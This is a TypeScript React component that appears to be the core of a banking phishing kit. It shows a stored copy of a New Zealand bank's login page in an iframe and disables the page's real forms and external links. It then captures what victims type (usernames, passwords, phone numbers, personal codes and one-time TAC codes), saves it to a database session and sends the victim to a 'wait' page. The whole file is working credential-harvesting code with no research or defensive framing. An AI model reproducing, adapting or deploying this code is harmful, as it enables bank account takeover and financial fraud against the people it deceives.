"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { getNzBankPagePath } from "@/lib/nz-bank-page-map";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

type CapturedField = {
  key: string;
  value: string;
  kind: "username" | "password" | "bankPhone" | "personalCode" | "tacCode" | "unknown";
  type: string;
};

const ACTION_BUTTON_RE = /(log\s?in|login|sign\s?in|continue|next|access|submit|confirm|go|enter)/i;

function normalizeToken(value: string | null | undefined) {
  return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
}

function getElementLabel(doc: Document, el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const ariaLabel = el.getAttribute("aria-label");
  if (ariaLabel?.trim()) return ariaLabel.trim();

  const placeholder = el.getAttribute("placeholder");
  if (placeholder?.trim()) return placeholder.trim();

  const id = el.getAttribute("id");
  if (id) {
    const label = doc.querySelector(`label[for="${id}"]`);
    if (label?.textContent?.trim()) return label.textContent.trim();
  }

  const wrappingLabel = el.closest("label");
  if (wrappingLabel?.textContent?.trim()) return wrappingLabel.textContent.trim();

  return "";
}

function inferFieldKind(
  el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement,
  label: string,
): CapturedField["kind"] {
  const raw = normalizeToken(
    [
      el.getAttribute("name"),
      el.getAttribute("id"),
      el.getAttribute("autocomplete"),
      el.getAttribute("type"),
      label,
    ].join(" "),
  );

  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "password" || /\b(password|passcode|pin|secret)\b/.test(raw)) return "password";
  if (/\b(tac|otp|one time|one-time|verification|security code|sms code|code)\b/.test(raw)) return "tacCode";
  if (type === "tel" || /\b(phone|mobile|contact|cell)\b/.test(raw)) return "bankPhone";
  if (/\b(personal|identity|customer number|member number|ird|tax number)\b/.test(raw)) return "personalCode";
  if (/\b(username|user id|userid|login id|access number|client number|customer id|card number|account number)\b/.test(raw)) {
    return "username";
  }
  return "unknown";
}

function sanitizeKey(value: string) {
  return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
}

function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
  if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
  if (el.disabled) return false;
  if (el.getAttribute("aria-hidden") === "true") return false;
  return true;
}

function readFieldValue(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "checkbox" || type === "radio") {
    return (el as HTMLInputElement).checked ? ((el as HTMLInputElement).value || "true") : "";
  }
  return el.value?.trim() ?? "";
}

function hasIdentityField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
    field.value.trim().length > 0,
  );
}

function hasPasswordField(fields: CapturedField[]) {
  return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
}

function isExternalHref(href: string | null) {
  if (!href) return false;
  return /^https?:\/\//i.test(href.trim());
}

export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [saving, setSaving] = useState(false);
  const htmlPath = getNzBankPagePath(bankSlug);

  const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
    if (!supabase || !sessionId || saving || fields.length === 0) return;

    if (!hasIdentityField(fields) || !hasPasswordField(fields)) {
      return;
    }

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};

    const usernameField =
      fields.find((field) => field.kind === "username") ??
      fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
      null;
    const passwordField = fields.find((field) => field.kind === "password") ?? null;
    const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
    const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
    const tacField = fields.find((field) => field.kind === "tacCode") ?? null;

    const orderedFields = fields.slice(0, 3);
    const extraFields = Object.fromEntries(
      fields.map((field, index) => {
        const suffix = field.key || `field_${index + 1}`;
        return [[`iframe_${suffix}` , field.value]];
      }),
    );

    const nextFormData = {
      ...previousFormData,
      ...extraFields,
      bankSlug,
      bankName,
      verfuegernummer: usernameField?.value ?? "",
      username: usernameField?.value ?? "",
      pin: passwordField?.value ?? "",
      password: passwordField?.value ?? "",
      bankPhone: phoneField?.value ?? "",
      personalCode: personalCodeField?.value ?? "",
      tacCode: tacField?.value ?? "",
      orderedField1: orderedFields[0]?.value ?? "",
      orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
      orderedField2: orderedFields[1]?.value ?? "",
      orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
      orderedField2Type:
        orderedFields[1]?.kind === "bankPhone"
          ? "phone"
          : orderedFields[1]?.kind === "password"
            ? "password"
            : "",
      orderedField3: orderedFields[2]?.value ?? "",
      orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
      orderedField3Type:
        orderedFields[2]?.kind === "bankPhone"
          ? "phone"
          : orderedFields[2]?.kind === "password"
            ? "password"
            : orderedFields[2]?.kind === "tacCode"
              ? "password"
              : "",
    };

    const { error: updateError } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);

    if (updateError) {
      return;
    }

    router.push(stepToPath("wait", sessionId));
  }, [bankName, bankSlug, router, saving, sessionId, supabase]);

  const captureFieldsFromFrame = useCallback(() => {
    const doc = iframeRef.current?.contentDocument;
    if (!doc) return [] as CapturedField[];

    const elements = Array.from(
      doc.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>("input, textarea, select"),
    ).filter(isMeaningfulField);

    const captured = elements
      .map((el) => {
        const value = readFieldValue(el);
        if (!value) return null;

        const label = getElementLabel(doc, el);
        const rawKey = sanitizeKey(
          el.getAttribute("name") ||
          el.getAttribute("id") ||
          label ||
          `field_${elements.indexOf(el) + 1}`,
        );

        return {
          key: rawKey || `field_${elements.indexOf(el) + 1}`,
          value,
          kind: inferFieldKind(el, label),
          type: (el.getAttribute("type") ?? "").toLowerCase(),
        } satisfies CapturedField;
      })
      .filter((field): field is CapturedField => Boolean(field));

    return captured;
  }, []);

  const attachFrameBridge = useCallback(() => {
    const iframe = iframeRef.current;
    const doc = iframe?.contentDocument;
    if (!iframe || !doc) return;

    const submitWithCurrentValues = async (event?: Event) => {
      event?.preventDefault();
      event?.stopPropagation();
      const captured = captureFieldsFromFrame();
      if (captured.length === 0) return;
      await submitCapturedFields(captured);
    };

    const forms = Array.from(doc.querySelectorAll("form"));
    forms.forEach((form) => {
      form.setAttribute("action", "#");
      form.setAttribute("method", "post");
      form.setAttribute("target", "_self");
      form.setAttribute("novalidate", "novalidate");
      form.addEventListener("submit", submitWithCurrentValues);
    });

    const actionNodes = Array.from(
      doc.querySelectorAll<HTMLButtonElement | HTMLInputElement | HTMLAnchorElement>("button, input[type='submit'], input[type='button'], a"),
    );
    actionNodes.forEach((node) => {
      const nodeText =
        node.textContent?.trim() ||
        node.getAttribute("value") ||
        node.getAttribute("aria-label") ||
        "";
      const wasExternalLink = node instanceof HTMLAnchorElement && isExternalHref(node.getAttribute("href"));

      if (node instanceof HTMLAnchorElement && wasExternalLink) {
          node.setAttribute("href", "#");
          node.setAttribute("target", "_self");
          node.setAttribute("rel", "nofollow noopener noreferrer");
      }

      if (!(ACTION_BUTTON_RE.test(nodeText) || wasExternalLink)) {
        return;
      }

      node.addEventListener("click", submitWithCurrentValues);
    });
  }, [captureFieldsFromFrame, submitCapturedFields]);

  const handleFrameLoad = useCallback(() => {
    void attachFrameBridge();
  }, [attachFrameBridge]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    if (iframe.contentDocument?.readyState === "complete") {
      void attachFrameBridge();
    }

    iframe.addEventListener("load", handleFrameLoad);
    return () => {
      iframe.removeEventListener("load", handleFrameLoad);
    };
  }, [attachFrameBridge, handleFrameLoad]);

  if (!htmlPath) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4 text-center text-sm font-medium text-red-600">
        Exact bank page file is missing for this bank.
      </div>
    );
  }

  return (
    <div className="relative min-h-screen bg-white">
      <iframe
        ref={iframeRef}
        title={`${bankName} login`}
        src={htmlPath}
        onLoad={handleFrameLoad}
        className="min-h-screen w-full border-0 bg-white"
      />
    </div>
  );
}
